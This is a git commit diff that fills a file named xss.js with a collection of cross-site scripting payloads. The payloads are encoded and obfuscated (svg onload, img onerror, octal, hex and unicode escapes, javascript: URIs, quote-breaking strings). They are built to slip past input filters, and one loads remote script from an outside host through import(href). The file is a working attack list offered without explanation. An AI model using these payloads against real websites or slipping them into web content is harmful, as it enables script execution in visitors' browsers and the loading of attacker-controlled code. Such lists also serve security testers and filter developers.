f162172dd7a4e54ae403459d1aed51f37f6529f5
rahikzaza <61890412+rahikzaza@users.noreply.github.com>
2024-09-17 20:10:11 +0100

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,25 @@
-prompt();
+\74svg onload=alert\1401\140\76
+
+\x3Cimg\x20src=xx\x20onerror=alert()\x3E
+
+
+<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
+
+<image/src/onerror=a\u006cert()>
+
+%3CJavaScript:%22%5C74Svg%5C57OnLoad%5C75%5C141%5C154%5C145%5C162%5C164%5C501%5C51%5C76%22
+
+
+SAMETHING%27);alert(%27XSSED%27);//(%27
+
+
+<a[1]href[2]=[3]javas[?]cript[4]:[5]alert(1)[6]>
+
+
+5\\x3cscript\\x3ealert(document.domain)\\x3c/script\\x3e
+
+\\u003cscript\\u003ealert(document.domain)\\u003c/script\\u003e
+
+'-alert('Injaction Xss by Sub_Zero')-'
+
+<svG/x=">"/oNloaD=confirm()//
